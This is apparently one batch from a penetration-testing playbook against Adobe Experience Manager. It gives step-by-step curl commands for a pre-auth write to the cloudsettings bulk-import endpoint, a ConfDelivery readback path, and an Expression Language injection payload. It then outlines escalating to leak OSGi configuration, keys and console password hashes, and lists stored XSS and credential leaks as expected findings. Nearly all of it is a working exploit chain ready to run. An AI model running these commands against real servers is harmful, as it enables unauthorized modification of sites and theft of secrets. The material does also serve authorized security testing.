# Batch 16 — Modern AEM: write gadget + EL config leak

## objective

Time-box the **cloudsettings / ConfDelivery / EL** chain from modern research:  
create/point a node → render chosen resourceType → Expression Language read of in-memory config.  

Last heavy batch on the AEM board.

## estimated_time

60–120 minutes

## prerequisites

- Write testing allowed  
- Prefer low-impact markers before secret scraping  
- Patched instances may fully fail — that is OK

## testing_workflow

### 1) Technique A — bulk import / cloudsettings write probe

```bash
T="https://TARGET"

curl -sk -o /tmp/w -w "%{http_code} %{size_download}\n" \
  -X POST "$T/cloudsettings.bulkimportConfig.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "importSource=UrlBased&sling:resourceType=/libs/granite/ui/components/shell/help/about/about.jsp"
head -c 400 /tmp/w; echo
```

If 404, try dispatcher mutations used earlier. If 401/403 only, need auth — stop or switch to authenticated session if in scope.

### 2) Technique B — ConfDelivery-style readback

Research pattern:

```text
GET /etc/cloudsettings.kernel.html/conf/global/settings/dam/import/cloudsettings/jcr:content
```

```bash
curl -sk -o /tmp/r -w "%{http_code} %{size_download}\n" \
  "$T/etc/cloudsettings.kernel.html/conf/global/settings/dam/import/cloudsettings/jcr:content"
head -c 500 /tmp/r; echo
```

### 3) Technique C — EL proof then stop-or-escalate

Minimal math proof (historical translationpage resourceType):

```bash
curl -sk -X POST "$T/cloudsettings.bulkimportConfig.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'importSource=UrlBased&sling:resourceType=/libs/cq/gui/components/projects/admin/actions/view/translationpage/translationpage.jsp&action=${7*7}'
```

Then fetch via ConfDelivery path; look for `49` in output.

If math works and program allows deeper impact, research used `pageContext.class.classLoader.bundle...properties` sprays to leak OSGi config (keys, console hashes). **One careful payload** — do not loop 10k times; note temp node cleanup limits (few shots per day historically).

## decision_points

| If… | Then… |
|-----|--------|
| EL math works | Escalate per scope to config leak PoC |
| Write works, render weak | Still report pre-auth write |
| All closed | AEM batch board complete — write summary findings |

## expected_findings

- Pre-auth/low-priv write, stored XSS via resourceType, EL config/credential leak

## next_batch_to_continue_with

**None (board complete).**  
Optional: re-run **07–08** if new access unlocked; or authenticated author testing outside this kit.
